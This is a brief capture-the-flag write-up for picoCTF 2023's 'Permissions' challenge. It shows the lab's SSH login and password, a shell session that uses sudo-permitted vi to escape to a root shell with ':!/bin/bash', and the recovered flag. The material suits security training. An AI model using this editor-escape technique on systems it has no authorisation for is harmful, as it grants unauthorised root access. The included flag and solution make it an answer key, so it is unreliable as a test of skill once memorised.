# Permissions
- Difficulty: Medium
- Category: `General Skills`  
- Date: 2024-09-22  
tags: `picoCTF 2023` `vim`  
refer to [Source](https://play.picoctf.org/practice/challenge/363?category=5&difficulty=2&page=1)
- my tags: `提權`

## Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 58868 picoplayer@saturn.picoctf.net
Password: NBD+zO8s4y
Can you login and read the root file?
- hint: What permissions do you have?

## Solution
``` shell
$ssh -p 58002 picoplayer@saturn.picoctf.net
...
$ls /root
ls: cannot open directory '/root': Permission denied
$whoami
picoplayer
$sudo -l
[sudo] password for picoplayer:
Sorry, try again.
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
``` shell
$sudo vi test
# :!/bin/bash
$whoami
root
$ls /root
$cd /root
$ls -a
.  ..  .bashrc  .flag.txt  .profile
$cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```
``` plain
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```

### Improving
